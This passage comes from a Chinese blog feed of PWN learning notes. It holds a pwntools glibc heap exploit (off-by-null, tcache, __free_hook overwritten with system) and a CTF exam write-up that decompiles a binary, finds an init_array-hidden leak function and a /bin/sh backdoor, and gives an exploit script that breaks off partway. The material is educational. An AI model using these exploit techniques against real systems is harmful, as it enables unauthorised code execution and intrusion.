class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./demo&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd</span>(<span class=\"params\">a</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;5.exit&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(a))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">4</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">1</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">2</span>,<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">3</span>,<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;c&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">4</span>,<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;d&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">0xf0</span> + p64(<span class=\"number\">0x100</span>))</span><br><span class=\"line\"><span class=\"comment\">#这里写一个0x100是为了绕过检查，因为之前的0x111被改成了0x100</span></span><br><span class=\"line\"><span class=\"comment\">#ptmalloc会根据nextchunk的prev_size字段检查是否大小匹配。这里写入0x100的地方正好是利用off-by-null漏洞后nextchunk的prev_size字段。</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>,<span class=\"number\">16</span>):</span><br><span class=\"line\">    alloc(i,<span class=\"number\">0x108</span>,<span class=\"string\">b&#x27;p&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>,<span class=\"number\">16</span>):</span><br><span class=\"line\">    free(i)</span><br><span class=\"line\"><span class=\"comment\"># tcache填充 </span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x19</span>,<span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">0x18</span> + p8(<span class=\"number\">0</span>))</span><br><span class=\"line\">alloc(<span class=\"number\">2</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;d&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">5</span>,<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;e&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">17</span>,<span class=\"number\">24</span>):</span><br><span class=\"line\">    alloc(i,<span class=\"number\">0x88</span>,<span class=\"string\">b&#x27;p&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">17</span>,<span class=\"number\">24</span>):</span><br><span class=\"line\">    free(i)</span><br><span class=\"line\"><span class=\"comment\"># 让2  free到unsortedbin里</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)  <span class=\"comment\"># 与之前残留的0x110一起合并 注意这个3的位置  0x90+0x110 =0x1a0 </span></span><br><span class=\"line\">alloc(<span class=\"number\">6</span>,<span class=\"number\">0xa0</span>,<span class=\"string\">b&#x27;\\xa0&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">5</span>) <span class=\"comment\"># 这里也很关键,再次释放5,5又与前面的2组合为</span></span><br><span class=\"line\">show(<span class=\"number\">6</span>)</span><br><span class=\"line\">leak_libc = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(leak_libc))</span><br><span class=\"line\">libc_base = leak_libc - <span class=\"number\">0x00007f74b3a5cca0</span> + <span class=\"number\">0x7f74b3671000</span> - <span class=\"number\">0x200</span></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">system = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">edit(<span class=\"number\">6</span>,<span class=\"number\">0xa0</span>,p8(<span class=\"number\">0</span>) * <span class=\"number\">0x80</span> + p64(<span class=\"number\">0x90</span>) + p64(<span class=\"number\">0x50</span>) + p64(free_hook))</span><br><span class=\"line\">pause()</span><br><span class=\"line\">alloc(<span class=\"number\">7</span>,<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">8</span>,<span class=\"number\">0x40</span>,p64(system))</span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"comment\">#log.success(hex(libc_base))</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>libc.symbols 覆盖的到底是什么呢?</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/",
            "title": "pwn入门-28-高级网络攻防考试一题",
            "date_published": "2023-06-02T13:00:51.000Z",
            "content_html": "<p>​\t\t在考试的时候没有做出来,考完后和老曹交流学会了,主要卡住的点,是走错了方向,一直在考虑堆的漏洞怎么利用,其实不是堆的漏洞,怎么说呢,其实是一个知识点的事,init_array这个节,会进行一些初始化操作,不知道确实很难搞…不过其实也不是没有办法,其实可以进行一些全局搜索之类的,寻找线索.</p>\n<p>​\t\t题目文件: 本链接加attachments.tar.gz</p>\n<h1 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h1><h2 id=\"寻找对应函数\"><a href=\"#寻找对应函数\" class=\"headerlink\" title=\"寻找对应函数\"></a>寻找对应函数</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (__fastcall *)(<span class=\"type\">const</span> <span class=\"type\">char</span> *, <span class=\"type\">char</span> **, <span class=\"type\">char</span> **))sub_14A9)(a1, a2, a3);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ((<span class=\"type\">void</span> (__fastcall *)(<span class=\"type\">const</span> <span class=\"type\">char</span> *))sub_1531)(a1);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;choice: &quot;</span>);</span><br><span class=\"line\">    a1 = <span class=\"string\">&quot;%d&quot;</span>;</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v4);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">4</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    ((<span class=\"type\">void</span> (*)(<span class=\"type\">const</span> <span class=\"type\">char</span> *, ...))((<span class=\"type\">char</span> *)*(&amp;off_5000 + v4 - <span class=\"number\">1</span>) + <span class=\"number\">0xDEADBEEF</span>LL))(<span class=\"string\">&quot;%d&quot;</span>, &amp;v4);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_1531</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. add&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. delete&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. edit&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4. exit&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t一上来看sub_1531是能看到菜单的,但是很明显,下面没有对应的函数,就感到很奇怪了,(<font color=\"red\">其实下次可以直接在ida的函数列表里找,如果不是花指令的话,花指令的话,还是直接看汇编,看有没有红色的代码</font>)</p>\n<p>​\t\t当时是在gdb中动态调试找到的对应的函数</p>\n<p>​\t\t同时发现了一个gift函数,用来泄露地址的,还发现了一个后门函数,可以直接getshell,于是现在的问题就变成了怎么执行这个后门函数呢? 也就是怎么劫持控制流, 覆盖返回地址 or 利用堆进行任意内存读写, 似乎 都不太行…于是就卡住了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_1206</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Ok, you find the gift&quot;</span>);</span><br><span class=\"line\">  v0 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%#lx, %#lx, %#lx\\n&quot;</span>, sub_1206, &amp;write, v0);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v2 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_11C9</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"柳暗花明差一村\"><a href=\"#柳暗花明差一村\" class=\"headerlink\" title=\"柳暗花明差一村\"></a>柳暗花明差一村</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  ((<span class=\"type\">void</span> (*)(<span class=\"type\">const</span> <span class=\"type\">char</span> *, ...))((<span class=\"type\">char</span> *)*(&amp;off_5000 + v4 - <span class=\"number\">1</span>) + <span class=\"number\">0xDEADBEEF</span>LL))(<span class=\"string\">&quot;%d&quot;</span>, &amp;v4);</span><br><span class=\"line\"></span><br><span class=\"line\">.data:<span class=\"number\">0000000000005000</span> off_5000        dq <span class=\"number\">0F</span>FFFFFFF21525389h   ; DATA XREF: main+A0↑o</span><br><span class=\"line\">.data:<span class=\"number\">0000000000005008</span>                 dq <span class=\"number\">0F</span>FFFFFFF21525477h</span><br><span class=\"line\">.data:<span class=\"number\">0000000000005010</span>                 dq <span class=\"number\">0F</span>FFFFFFF21525518h</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t当时在main函数中,看到了这个,也理解了off_5000是data节中的数据,利用这里的数据进行一些运算,然后就到达了函数地址,例如0位置,运算后就是add函数的位置,但是 gift和后门函数,都在内存中没有这个偏移,堆虽然可以写,但是不知道堆的地址呀,但gift可以泄露,但gift怎么调用呢??  于是就卡死了………</p>\n<p>​\t\t<font color=\"red\">其实这里可以尝试爆破的…(我觉得),后面有时间可以试试</font></p>\n<p>​\t\t于是就在这里卡死了…就像开头提的一样,其实在init_array中有初始化这个操作,保存了gift对应的地址,怎么说呢…应该让自己多学一点工具,辅助自己去探索可能的路径</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/image-20230602223110772.png\" alt=\"image-20230602223110772\"></p>\n<h2 id=\"正解\"><a href=\"#正解\" class=\"headerlink\" title=\"正解\"></a>正解</h2><p>​\t\telf执行时会先走这个init,这里面有个sub_144E,就是它把gift函数加载进去了,能够看到,它加载到的地址的偏移就是0x29C0</p>\n<p>&amp;0xFFFFFFFFFFFFF000LL是干了啥呢? 与之后就是程序0x5000的位置,是为了得到这个位置,然后+0x29C0就是存储gift的地方</p>\n<p>​\t\t不过这里为啥是0xDEADBF61LL,这是什么逻辑,后面在main中要+0xDEADBEEFLL,</p>\n<p>​\t\t所以0x1278 - 0xDEADBF61 +0xDEADBEEF &#x3D; 0x1206,就是gift的地址,所以这个地址应该是这个原因,因为要考虑到pie,所以要用一个函数或者变量的地址,这里用了0x1278的, 和它差多少呢?  就是  0x1206  -  0xDEADBEEF-0x1278,也就是-0xdeadbf61</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D60                 ;org <span class=\"number\">3</span>D60h</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D60 off_3D60        dq offset sub_11C0      ; DATA XREF: LOAD:<span class=\"number\">0000000000000168</span>↑o</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D60                                         ; LOAD:<span class=\"number\">00000000000002F</span>0↑o</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D68                 dq offset sub_144E</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D68 _init_array     ends</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D68</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_144E</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  *(_QWORD *)(((<span class=\"type\">unsigned</span> __int64)&amp;unk_5018 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL) + <span class=\"number\">0x29C0</span>) = (<span class=\"type\">char</span> *)sub_1278 - <span class=\"number\">0xDEADBF61</span>LL;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以就可以先通过调用gift来进行泄露地址,0x29C0 &#x3D; 10688 , 10688&#x2F;8 &#x3D; 1336,这是因为指针的偏移,按照char类型来算????? 是吗?</p>\n<p>​\t因为在main中还有个-1,所以是1337,输入1337就可以调用gift了!</p>\n<h2 id=\"最终步骤\"><a href=\"#最终步骤\" class=\"headerlink\" title=\"最终步骤\"></a>最终步骤</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">choice: <span class=\"number\">1337</span></span><br><span class=\"line\">Ok, you find the gift</span><br><span class=\"line\"><span class=\"number\">0x5557ed770206</span>, <span class=\"number\">0x7f1094c79d80</span>, <span class=\"number\">0x5557eea752a0</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t之前取这些数据的时候老出问题…….</p>\n<p>​\t\t先把前面的数据接收了,然后再接收三个值,怎么接收呢,可以按照长度来,但是感觉比较der,还是看老曹的..recvline之后strip去掉最后的空格,然后decode解码,然后通过”, “分割,这样gift就成了数组, 0 1 2 对应着三个值,就可以了!</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gift = (p.recvline().strip()).decode().split(<span class=\"string\">&#x27;, &#x27;</span>)</span><br><span class=\"line\">pie = <span class=\"built_in\">int</span>(gift[<span class=\"number\">0</span>], <span class=\"number\">16</span>) - <span class=\"number\">0x1206</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(pie))</span></span><br><span class=\"line\">leak_heap_addr = <span class=\"built_in\">int</span>(gift[<span class=\"number\">2</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(hex(leak_heap_addr))</span></span><br><span class=\"line\">vul_addr = leak_heap_addr + <span class=\"number\">0x20</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后把后门地址写入堆地址,此时也有堆的地址了,再次利用main函数中的调用逻辑,调用就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">backdoor_addr = pie + <span class=\"number\">0x11c9</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;choice: &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;content: &#x27;</span>)</span><br><span class=\"line\">p.send(p64(backdoor_addr - <span class=\"number\">0xdeadbeef</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">trigger_input = (vul_addr - pie - <span class=\"number\">0x5000</span>) <span class=\"comment\">// 8 + 1</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t&#x2F;&#x2F;是整除的意思</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = <span class=\"string\">&quot;./pwn&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(elf)</span><br><span class=\"line\">p =remote(<span class=\"string\">&quot;xxxxx&quot;</span>, xxx)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;choice: &#x27;</span>, <span class=\"built_in\">str</span>(<span class=\"number\">1337</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Ok, you find the gift\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gift = (p.recvline().strip()).decode().split(<span class=\"string\">&#x27;, &#x27;</span>)</span><br><span class=\"line\">pie = <span class=\"built_in\">int</span>(gift[<span class=\"number\">0</span>], <span class=\"number\">16</span>) - <span class=\"number\">0x1206</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(pie))</span></span><br><span class=\"line\">leak_heap_addr = <span class=\"built_in\">int</span>(gift[<span class=\"number\">2</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"><span 